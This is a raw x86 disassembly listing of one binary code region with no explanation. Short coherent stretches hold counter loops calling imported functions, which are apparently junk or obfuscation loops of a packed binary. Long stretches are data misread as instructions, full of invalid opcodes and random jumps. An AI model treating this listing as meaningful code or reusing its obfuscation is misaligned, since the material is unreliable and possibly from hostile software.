  4039ac:	mov    DWORD PTR ds:0x433693,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433687,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433687,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433687,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433687
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433687,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433697
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x43367b,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x43367b
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x43367b,ebx
  403a19:	cmp    DWORD PTR ds:0x43367b,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x43367b,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x433757,0x19
  403a4c:	cmp    DWORD PTR ds:0x433757,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x433757,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x433757
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x433757,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43379b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403aec
  403acb:	(bad)  
  403acc:	push   edi
  403acd:	sbb    DWORD PTR [eax],esp
  403acf:	adc    BYTE PTR [esi+0x7e],bh
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403a5c
  403ad7:	ins    DWORD PTR es:[edi],dx
  403ad8:	cmp    DWORD PTR [esi-0x15d52cc0],ebx
  403ade:	or     al,0x40
  403ae0:	mov    ah,0x4c
  403ae2:	(bad)  
  403ae3:	push   ebx
  403ae4:	cmp    dh,BYTE PTR [ecx+0x2d39697d]
  403aea:	xchg   BYTE PTR [ecx],dl
  403aec:	mov    ds:0xd1963cec,eax
  403af1:	or     ebx,DWORD PTR [edx]
  403af3:	jmp    0x403b5c
  403af5:	das    
  403af6:	xor    al,0xb2
  403af8:	push   0xffffffa9
  403afa:	out    dx,al
  403afb:	shl    eax,cl
  403afd:	adc    edx,0xd5a32a38
  403b03:	mov    bh,0x56
  403b05:	mov    ebx,0x3d1d482b
  403b0a:	xlat   BYTE PTR ds:[ebx]
  403b0b:	mov    ch,0x1d
  403b0d:	sbb    al,0x26
  403b0f:	push   ebx
  403b10:	lds    edx,FWORD PTR [edx-0x312cfa6e]
  403b16:	ficom  DWORD PTR [eax+0x32360adb]
  403b1c:	nop
  403b1d:	adc    al,0xfc
  403b1f:	cmc    
  403b20:	mov    ebx,0x530acbb2
  403b25:	xchg   ebp,eax
  403b26:	ins    BYTE PTR es:[edi],dx
  403b27:	mov    dl,0xa5
  403b29:	sahf   
  403b2a:	adc    eax,DWORD PTR [esi+edx*2-0x30]
  403b2e:	(bad)  
  403b2f:	outs   dx,BYTE PTR ds:[esi]
  403b30:	fisttp DWORD PTR [ecx]
  403b32:	sub    BYTE PTR [ebp+0x37d5d7a1],al
  403b38:	int3   
  403b39:	outs   dx,BYTE PTR ds:[esi]
  403b3a:	imul   ebx,DWORD PTR [edi+0x57],0x7b63e984
  403b41:	jge    0x403ac5
  403b43:	jl     0x403b4c
  403b45:	stc    
  403b46:	sbb    DWORD PTR [ebp+0x77],ebx
  403b49:	mov    ecx,0xc3c83cc5
  403b4e:	ds ror edx,0x49
  403b52:	sub    al,0xcd
  403b54:	fstp   DWORD PTR [edi+edi*8+0x7ace0ad9]
  403b5b:	mov    edx,0xf7c9fb65
  403b60:	or     BYTE PTR [ebp-0x3c3dbf91],ch
  403b66:	inc    eax
  403b67:	les    ebx,FWORD PTR [ecx+0x52]
  403b6a:	stos   DWORD PTR es:[edi],eax
  403b6b:	jp     0x403b1e
  403b6d:	push   ebp
  403b6e:	iret   
  403b6f:	add    BYTE PTR [eax-0x4a84f96],bh
  403b75:	fmul   DWORD PTR [ecx-0x2bb02a4]
  403b7b:	fwait
  403b7c:	jl     0x403b11
  403b7e:	add    eax,0x43243586
  403b83:	mov    cl,0xe8
  403b85:	lods   al,BYTE PTR ds:[esi]
  403b86:	mov    cl,0x10
  403b88:	dec    ebx
  403b89:	lods   eax,DWORD PTR ds:[esi]
  403b8a:	sbb    al,0xa0
  403b8c:	add    ecx,ebp
  403b8e:	out    0x56,eax
  403b90:	xchg   edi,eax
  403b91:	xchg   esi,eax
  403b92:	sub    bl,BYTE PTR [eax]
  403b94:	out    dx,eax
  403b95:	ss cs int3 
  403b98:	out    0x1c,al
  403b9a:	ficom  DWORD PTR [edx+0x7951b49a]
  403ba0:	loopne 0x403bf5
  403ba2:	test   BYTE PTR [ecx+0x7d],dl
  403ba5:	sub    DWORD PTR [edx-0x6a],0x78
  403ba9:	not    DWORD PTR [edi]
  403bab:	mov    dh,BYTE PTR [edx+0x29]
  403bae:	mov    dh,0x27
  403bb0:	push   esp
  403bb1:	xor    ecx,DWORD PTR [esi+0x71]
  403bb4:	imul   ecx,DWORD PTR [ecx],0x264c13b
  403bba:	jmp    0x403bc7
  403bbc:	les    edx,FWORD PTR [esi+0x4c86b7a7]
  403bc2:	or     BYTE PTR ds:[ebx],bh
  403bc5:	addr16 mov bh,al
  403bc8:	mov    ds:0xb9471838,al
  403bcd:	das    
  403bce:	inc    esp
  403bcf:	scas   al,BYTE PTR es:[edi]
  403bd0:	(bad)  
  403bd1:	mov    cl,0x64
  403bd3:	sbb    eax,DWORD PTR [ecx+0x3954267e]
  403bd9:	pop    ds
  403bda:	das    
  403bdb:	mov    ch,0x15
  403bdd:	mov    dl,0xa4
  403bdf:	ror    BYTE PTR es:[ebp-0x3410889e],cl
  403be6:	jg     0x403b9c
  403be8:	into   
  403be9:	xchg   DWORD PTR [ebx+0x64],ebp
  403bec:	int    0x23
  403bee:	adc    bh,BYTE PTR [edx+0x16f2fd92]
  403bf4:	mov    edx,0xf73a745e
  403bf9:	pusha  
  403bfa:	push   esp
  403bfb:	adc    ch,BYTE PTR [eax-0x1a3b5623]
  403c01:	outs   dx,DWORD PTR ds:[esi]
  403c02:	jl     0x403bfd
  403c04:	sbb    eax,0x451fac3e
  403c09:	dec    esi
  403c0a:	sti    
  403c0b:	cmp    eax,0x1dc62674
  403c10:	leave  
  403c11:	jle    0x403c72
  403c13:	sbb    al,0xac
  403c15:	xor    eax,0xc4d8af6
  403c1a:	xor    BYTE PTR [eax],al
  403c1c:	push   es
  403c1d:	repnz push esp
  403c1f:	push   esi
  403c20:	rcr    DWORD PTR [ebx-0xa825b64],1
  403c26:	fcmovne st,st(5)
  403c28:	loope  0x403be0
  403c2a:	mov    fs,WORD PTR [eax-0x544a4b16]
  403c30:	adc    al,0x3a
  403c32:	jmp    0x16c71036
  403c37:	adc    ecx,DWORD PTR ds:0xbfb15324
  403c3d:	pop    edi
  403c3e:	leave  
  403c3f:	adc    al,0x27
  403c41:	cli    
  403c42:	pushf  
  403c43:	cmp    BYTE PTR [ebx],ch
  403c45:	aam    0x7a
  403c47:	push   ss
  403c48:	retf   
  403c49:	shl    DWORD PTR [ebp+0x5a],cl
  403c4c:	mov    ds:0x784ca5f2,eax
  403c51:	adc    al,0x9d
  403c53:	(bad)  
  403c54:	ins    DWORD PTR es:[edi],dx
  403c55:	xchg   edx,eax
  403c56:	dec    ebx
  403c57:	push   es
  403c58:	js     0x403c5e
  403c5a:	sbb    al,al
  403c5c:	rcr    DWORD PTR [ebx+0x75],0x11
  403c60:	fucomi st,st(5)
  403c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c63:	sub    al,0xbe
  403c65:	mov    eax,ds:0xce3a428c
  403c6a:	sbb    eax,0xb7e75ff8
  403c6f:	jbe    0x403c35
  403c71:	dec    DWORD PTR [ebx+ebp*4]
  403c74:	and    eax,DWORD PTR [edi+0x29cf44a6]
  403c7a:	sub    eax,0xea1f49ff
  403c7f:	ins    DWORD PTR es:[edi],dx
  403c80:	mov    BYTE PTR [esi+0x79],dl
  403c83:	mov    cl,BYTE PTR [edi+0x50]
  403c86:	sbb    eax,0xd55a0cab
  403c8b:	sub    BYTE PTR ds:0x27c51caa,ah
  403c91:	shl    BYTE PTR [eax-0xfcd3035],0x96
  403c98:	cmp    bh,BYTE PTR [eax]
  403c9a:	cld    
  403c9b:	ins    DWORD PTR es:[edi],dx
  403c9c:	repz pop es
  403c9e:	fist   WORD PTR [edi-0x4d]
  403ca1:	test   DWORD PTR [ebp-0x23d7e09a],ebx
  403ca7:	mov    BYTE PTR ds:0x71377fc0,cl
  403cad:	mov    bh,0x87
  403caf:	or     DWORD PTR [ebx+ebx*4-0x5f1c31b5],ecx
  403cb6:	push   es
  403cb7:	cmc    
  403cb8:	mov    esi,0x332fa2fe
  403cbd:	(bad)  
  403cbe:	iret   
  403cbf:	jmp    0x7af3b94b
  403cc4:	inc    esi
  403cc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cc6:	jae    0x403cf1
  403cc8:	daa    
  403cc9:	and    al,0x59
  403ccb:	mov    cl,0xd1
  403ccd:	dec    ebx
  403cce:	sub    al,0x2c
  403cd0:	push   ecx
  403cd1:	sbb    al,0x0
  403cd3:	pop    eax
  403cd4:	dec    esp
  403cd5:	arpl   WORD PTR [ecx+ebx*1+0x6b12ff27],si
  403cdc:	and    DWORD PTR [ebx*1-0xcd03391],esp
  403ce3:	fisttp DWORD PTR [eax+0x16]
  403ce6:	push   esp
  403ce7:	cmp    eax,0x5468e287
  403cec:	pop    edi
  403ced:	xlat   BYTE PTR ds:[ebx]
  403cee:	pusha  
  403cef:	mov    cs:0xd7f26bc,al
  403cf5:	push   DWORD PTR [ebp+0x60]
  403cf8:	ror    DWORD PTR [edi],cl
  403cfa:	aad    0x30
  403cfc:	sbb    cl,al
  403cfe:	dec    ebp
  403cff:	push   0x79
  403d01:	jne    0x403cbd
  403d03:	fsubr  DWORD PTR [edi]
  403d05:	outs   dx,BYTE PTR ds:[esi]
  403d06:	pop    ebx
  403d07:	div    DWORD PTR [ebx+eiz*2-0x42]
  403d0b:	retf   0x5159
  403d0e:	popf   
  403d0f:	xchg   ecx,eax
  403d10:	int3   
  403d11:	mov    al,0x86
  403d13:	in     al,dx
  403d14:	cmp    DWORD PTR ss:[ebp+0x73],eax
  403d18:	xor    eax,DWORD PTR [esi+0x115c6aab]
  403d1e:	fwait
  403d1f:	inc    eax
  403d20:	mov    ds:0x8ae066,eax
  403d25:	aad    0x38
  403d27:	clc    
  403d28:	jns    0x403cba
  403d2a:	test   al,0x51
  403d2c:	sbb    BYTE PTR [edi+0x8],ch
  403d2f:	mov    al,0x2b
  403d31:	mov    ds:0x7cbeace4,al
  403d36:	cwde   
  403d37:	pop    ds
  403d38:	mov    edx,0xeabe5c14
  403d3d:	out    dx,al
  403d3e:	dec    esp
  403d3f:	add    esi,ecx
  403d41:	out    dx,al
  403d42:	cmp    edx,ebx
  403d44:	cmp    eax,0x7a6e21dc
  403d49:	cmp    DWORD PTR [ecx+0x27262379],edx
  403d4f:	js     0x403d8f
  403d51:	xor    DWORD PTR [edx],ebx
  403d53:	sahf   
  403d54:	push   ds
  403d55:	adc    DWORD PTR [edi+esi*4],edi
  403d58:	rol    DWORD PTR [edi+0x769efe1a],cl
  403d5e:	sar    BYTE PTR [ecx-0x12c2195c],cl
  403d64:	push   edx
  403d65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d66:	test   BYTE PTR [ecx-0x62d775fc],cl
  403d6c:	xor    bl,BYTE PTR [esi+0x6152518c]
  403d72:	sbb    edx,ecx
  403d74:	je     0x403ded
  403d76:	loope  0x403db8
  403d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d79:	push   0xffffffa9
  403d7b:	sub    ebx,DWORD PTR ds:0x57bbe880
  403d81:	stc    
  403d82:	nop
  403d83:	aas    
  403d84:	arpl   sp,bx
  403d86:	add    al,0x8b
  403d88:	adc    BYTE PTR [ecx-0x66ade3ee],dh
  403d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d8f:	imul   esi,esi,0x4f
  403d92:	scas   eax,DWORD PTR es:[edi]
  403d93:	or     BYTE PTR [ecx],bh
  403d95:	in     al,0xd4
  403d97:	mov    ebx,0xd6ca08f1
  403d9c:	not    DWORD PTR [ebx+0x31a5ff35]
  403da2:	push   es
  403da3:	mov    DWORD PTR [edx-0x503231b2],esi
  403da9:	xchg   ebp,eax
  403daa:	and    al,0xe0
  403dac:	and    ebx,DWORD PTR [edx]
  403dae:	bound  edi,QWORD PTR [edi]
  403db0:	(bad)  
  403db1:	and    al,0x12
  403db3:	pop    edi
  403db4:	xchg   DWORD PTR [bp+si-0x5c],ecx
  403db8:	not    DWORD PTR [ebx+0x5d8b2b30]
  403dbe:	lock sub ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffffce
  403e75:	out    0x56,eax
  403e77:	int    0xa
  403e79:	pop    ds
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403eb2
  403e81:	xchg   edi,eax
  403e82:	out    0x8a,eax
  403e84:	mov    dl,0x13
  403e86:	out    dx,eax
  403e87:	out    0x4a,eax
  403e89:	push   0x78
  403e8b:	mov    ebx,0x75e2786e
  403e90:	(bad)  
  403e91:	retf   0x5436
  403e94:	or     BYTE PTR [ecx],al
  403e96:	mov    BYTE PTR [esi+0x6ace35ab],dh
  403e9c:	pop    edi
  403e9d:	push   edx
  403e9e:	sbb    eax,0xc665cf66
  403ea3:	sub    ebx,esp
  403ea5:	outs   dx,DWORD PTR ds:[esi]
  403ea6:	idiv   DWORD PTR [edi-0x370d676b]
  403eac:	cmp    BYTE PTR [edi+0x5dbb3e93],0x7f
  403eb3:	in     eax,dx
  403eb4:	jmp    0x2970:0xcf30a4de
  403ebb:	lea    ecx,[esi+0x67]
  403ebe:	aam    0xb4
  403ec0:	push   0x51
  403ec2:	cmp    al,0xc0
  403ec4:	repnz push esi
  403ec6:	dec    esp
  403ec7:	es ss fld st(5)
  403ecb:	sub    al,0x6b
  403ecd:	or     BYTE PTR [ebx+0x2e3371d5],0x99
  403ed4:	shl    edi,cl
  403ed6:	pusha  
  403ed7:	or     ch,bh
  403ed9:	add    eax,0x42270e4a
  403ede:	icebp  
  403edf:	xor    eax,0x323dcec8
  403ee4:	and    ecx,DWORD PTR [ecx]
  403ee6:	lock enter 0xf7d5,0xd
  403eeb:	mov    esi,edx
  403eed:	and    al,0x18
  403eef:	push   ebp
  403ef0:	iret   
  403ef1:	mov    dl,0x47
  403ef3:	pop    es
  403ef4:	mov    ds:0x7a8a2a88,eax
  403ef9:	test   ah,bh
  403efb:	jbe    0x403ef3
  403efd:	sub    edi,0x1107d57d
  403f03:	out    0x58,al
  403f05:	bnd jne 0x403f02
  403f08:	in     al,0xe9
  403f0a:	adc    BYTE PTR [ebx-0x1838c13],ch
  403f10:	mov    edi,0x8b4c9280
  403f15:	loope  0x403ed9
  403f17:	les    esp,FWORD PTR [ebx]
  403f19:	inc    esi
  403f1a:	or     eax,0xcce6bea9
  403f1f:	mov    ebx,0x7f1f1f6a
  403f24:	(bad)  
  403f25:	jb     0x403f1f
  403f27:	add    DWORD PTR [edx-0x35],edx
  403f2a:	xor    ebx,edx
  403f2c:	fsubr  DWORD PTR [ecx]
  403f2e:	inc    ebp
  403f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f30:	daa    
  403f31:	shl    BYTE PTR [esi-0x11b0dd8d],cl
  403f37:	pop    edx
  403f38:	(bad)  
  403f39:	call   0x13aaa94e
  403f3e:	jmp    FWORD PTR [esi-0x63]
  403f41:	test   DWORD PTR [ecx],edx
  403f43:	jmp    0x44a:0x4c2d65aa
  403f4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f4b:	sub    esp,DWORD PTR [ebp+eiz*4-0x2ae0be99]
  403f52:	jo     0x403f16
  403f54:	shr    DWORD PTR [esi],cl
  403f56:	push   0xffffffea
  403f58:	sub    al,0x45
  403f5a:	xchg   ebp,eax
  403f5b:	cmp    esp,ebx
  403f5d:	push   es
  403f5e:	cwde   
  403f5f:	mov    WORD PTR [edx-0x53],gs
  403f62:	push   es
  403f63:	pop    ebx
  403f64:	outs   dx,BYTE PTR ds:[esi]
  403f65:	mov    edi,0x15eb9252
  403f6a:	ss daa 
  403f6c:	adc    ebp,ebx
  403f6e:	rol    DWORD PTR [edx+0x45],0xba
  403f72:	leave  
  403f73:	stos   BYTE PTR es:[edi],al
  403f74:	or     eax,0xf28c10b
  403f79:	inc    ebx
  403f7a:	mov    ch,0x49
  403f7c:	ss and al,0xd0
  403f7f:	(bad)  
  403f80:	jo     0x403f96
  403f82:	and    eax,0xa113e6ad
  403f87:	mov    esi,esp
  403f89:	call   0xfe8b1799
  403f8e:	cmp    ebx,ecx
  403f90:	jno    0x403fc9
  403f92:	stc    
  403f93:	sbb    DWORD PTR [edx],eax
  403f95:	fisttp QWORD PTR [ecx]
  403f97:	pop    ebp
  403f98:	dec    esp
  403f99:	sub    cl,BYTE PTR [ebp-0x7c]
  403f9c:	jno    0x403fa1
  403f9e:	and    DWORD PTR [ecx+0x1e4b9915],edi
  403fa4:	add    edi,esi
  403fa6:	shld   DWORD PTR [eax],eax,cl
  403fa9:	inc    edi
  403faa:	dec    ebp
  403fab:	and    al,0x81
  403fad:	jge    0x403f89
  403faf:	not    BYTE PTR [esi+0xf]
  403fb2:	sub    BYTE PTR [edx+0x6e15b16a],cl
  403fb8:	ds jmpw 0x70d1
  403fbd:	push   0x47
  403fbf:	push   esi
  403fc0:	and    al,bh
  403fc2:	dec    edx
  403fc3:	sub    esi,ecx
  403fc5:	(bad)  
  403fc6:	data16 out dx,al
  403fc8:	lahf   
  403fc9:	aaa    
  403fca:	dec    edi
  403fcb:	xor    BYTE PTR [ecx-0x50],al
  403fce:	and    esi,DWORD PTR [ebp+0x5200c3e7]
  403fd4:	jmp    0x77e10c7f
  403fd9:	mov    BYTE PTR [ebx-0x38],ah
  403fdc:	xor    BYTE PTR [edi+0x32],cl
  403fdf:	and    DWORD PTR [edx-0x42],esi
  403fe2:	mov    DWORD PTR [ebx+0x4c],0xaf59fb2a
  403fe9:	mov    al,0x19
  403feb:	arpl   WORD PTR [esi],ax
  403fed:	ins    DWORD PTR es:[edi],dx
  403fee:	jp     0x403fe3
  403ff0:	cld    
  403ff1:	mov    ds:0x916bec0c,al
  403ff6:	pusha  
  403ff7:	icebp  
  403ff8:	and    esp,DWORD PTR [ebp+0x4e]
  403ffb:	and    ecx,esi
  403ffd:	push   edx
  403ffe:	or     DWORD PTR [esi+0x43cf6520],eax
  404004:	mov    dh,0x3c
  404006:	stos   BYTE PTR es:[edi],al
  404007:	in     al,0x3d
  404009:	push   ebx
  40400a:	xchg   edx,eax
  40400b:	inc    eax
  40400c:	bound  ecx,QWORD PTR [edx]
  40400e:	adc    ecx,0xfffffff7
  404011:	sbb    BYTE PTR [edx],al
  404013:	jecxz  0x403fc6
  404015:	push   esp
  404016:	push   0x8275210e
  40401b:	iret   
  40401c:	ja     0x404056
  40401e:	mov    BYTE PTR [esp+ecx*2+0x13],dl
  404022:	inc    ebx
  404023:	cmp    al,0x1e
  404025:	xchg   DWORD PTR [eax+0x2f],edx
  404028:	sbb    eax,0xa87ffb5f
  40402d:	out    0xd,al
  40402f:	rcr    BYTE PTR ds:0x35c93038,1
  404035:	loop   0x404090
  404037:	sbb    al,0x1b
  404039:	jmp    0x403fcd
  40403b:	pop    esi
  40403c:	mov    eax,ds:0x8b25fbd3
  404041:	dec    eax
  404042:	fidivr DWORD PTR [eax+0x72]
  404045:	mov    WORD PTR [edi+0x2984e253],?
  40404b:	mov    eax,0xe21a753e
  404050:	cld    
  404051:	adc    BYTE PTR [ebp-0x7a8a74ef],dh
  404057:	jo     0x404073
  404059:	jg     0x4040c5
  40405b:	mov    eax,0x7d682b4c
  404060:	ja     0x403ff0
  404062:	dec    esp
  404063:	fild   WORD PTR [ebx-0x55026cf0]
  404069:	push   es
  40406a:	inc    ecx
  40406b:	pop    ebx
  40406c:	cwde   
  40406d:	mul    BYTE PTR [eax+0x5041c376]
  404073:	ds loopne 0x404025
  404076:	jecxz  0x4040c8
  404078:	sahf   
  404079:	push   es
  40407a:	ins    DWORD PTR es:[edi],dx
  40407b:	adc    ah,BYTE PTR [ebp-0x71]
  40407e:	inc    ecx
  40407f:	ss dec ecx
  404081:	mov    dh,0x5f
  404083:	rcr    edx,1
  404085:	lods   eax,DWORD PTR ds:[esi]
  404086:	dec    ebp
  404087:	leave  
  404088:	or     dh,ch
  40408a:	sub    dl,cl
  40408c:	or     bl,cl
  40408e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40408f:	ja     0x4040da
  404091:	call   0xd1677375
  404096:	ja     0x4040b2
  404098:	test   ah,ch
  40409a:	imul   esi,DWORD PTR ds:0xe21bb2c4,0x22607d2e
  4040a4:	adc    esi,edx
  4040a6:	push   ecx
  4040a7:	addr16 pop ss
  4040a9:	lea    esi,[ebp+ecx*1+0x5c]
  4040ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040ae:	(bad)  
  4040af:	dec    esp
  4040b0:	out    dx,al
  4040b1:	and    ebp,DWORD PTR [eax+0x1]
  4040b4:	jb     0x404118
  4040b6:	lods   eax,DWORD PTR ds:[esi]
  4040b7:	repnz pop ebx
  4040b9:	(bad)  
  4040ba:	ins    DWORD PTR es:[edi],dx
  4040bb:	xchg   ecx,eax
  4040bc:	cmp    DWORD PTR [edi-0x6d29c66c],ebx
  4040c2:	or     al,0xd5
  4040c4:	sbb    DWORD PTR [ebx+0x61965c30],0x57
  4040cb:	jmp    0x404094
  4040cd:	sbb    al,0x71
  4040cf:	imul   edi,DWORD PTR [eax-0x6b],0xfffffff7
  4040d3:	inc    esi
  4040d4:	fadd   DWORD PTR [ebx+esi*1+0x419ddf14]
  4040db:	or     BYTE PTR [ecx+0x1d],0x87
  4040df:	and    esp,DWORD PTR [edx-0x35]
  4040e2:	imul   ecx,DWORD PTR [ecx-0x545d716e],0x56
  4040e9:	bnd jne 0x4040f5
  4040ec:	pop    eax
  4040ed:	sub    bl,ch
  4040ef:	mov    bh,0x58
  4040f1:	ret    
  4040f2:	xchg   esi,eax
  4040f3:	sbb    al,0x48
  4040f5:	in     al,dx
  4040f6:	mov    BYTE PTR [ecx+ebp*1-0x542ec110],ah
  4040fd:	lods   al,BYTE PTR ds:[esi]
  4040ff:	bsf    esi,DWORD PTR [ecx-0x48]
  404103:	sub    BYTE PTR [eax+0x153d018e],bh
  404109:	fist   WORD PTR [esi+0x1f5b5e8f]
  40410f:	repnz adc DWORD PTR [ebx+0xe98cd72],ecx
  404116:	dec    edi
  404117:	hlt    
  404118:	adc    ecx,DWORD PTR [eax-0x10f2c0da]
  40411e:	loop   0x40410a
  404120:	jp     0x4040f0
  404122:	push   esp
  404123:	fwait
  404124:	shl    edx,0xfe
  404127:	imul   ebx,esp,0x57
  40412a:	jecxz  0x40417b
  40412c:	push   0x73ae416d
  404131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404132:	adc    esp,ebp
  404134:	push   ecx
  404135:	push   esp
  404136:	loop   0x404161
  404138:	mov    ch,0xd7
  40413a:	push   ds
  40413b:	pop    eax
  40413c:	jmp    0x404198
  40413e:	pop    es
  40413f:	inc    DWORD PTR [esi-0x4a]
  404142:	xor    bh,BYTE PTR ds:0x975730a2
  404148:	scas   eax,DWORD PTR es:[edi]
  404149:	sub    DWORD PTR [esi-0xd08af99],edx
  40414f:	push   esi
  404150:	dec    ebx
  404151:	mov    edx,0x34033319
  404156:	test   eax,0x7f797f42
  40415b:	jl     0x4041c8
  40415d:	mov    ebx,0x52f1547c
  404162:	mov    al,ds:0x2bc661ef
  404167:	fistp  QWORD PTR [ebx]
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    dl,cl
  40418b:	jl     0x404134
  40418d:	(bad)  
  40418e:	je     0x4041ad
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x404210
  404197:	xchg   ebx,eax
  404198:	lds    ebx,FWORD PTR [ebp+0xa]
  40419b:	cmp    ebp,DWORD PTR [esi-0x7986b208]
  4041a1:	adc    BYTE PTR [edx+0xd],dh
  4041a4:	cmp    al,0xad
  4041a6:	dec    edi
  4041a7:	push   0x13
  4041a9:	loope  0x40419e
  4041ab:	cmp    esp,esi
  4041ad:	push   esi
  4041ae:	or     DWORD PTR [esi+edi*2+0x78],edx
  4041b2:	mov    edi,?
  4041b4:	dec    ecx
  4041b5:	pop    ecx
  4041b6:	add    BYTE PTR [ebp-0x382d8eb9],bh
  4041bc:	sti    
  4041bd:	outs   dx,DWORD PTR ds:[esi]
  4041be:	sbb    dl,dh
  4041c0:	paddusw mm6,QWORD PTR [edi+0x75ac524c]
  4041c7:	sub    ch,BYTE PTR [esi+edi*4-0x2da5f659]
  4041ce:	je     0x404220
  4041d0:	mov    eax,ds:0xcce9ccca
  4041d5:	inc    eax
  4041d6:	arpl   WORD PTR [esi-0x3],bp
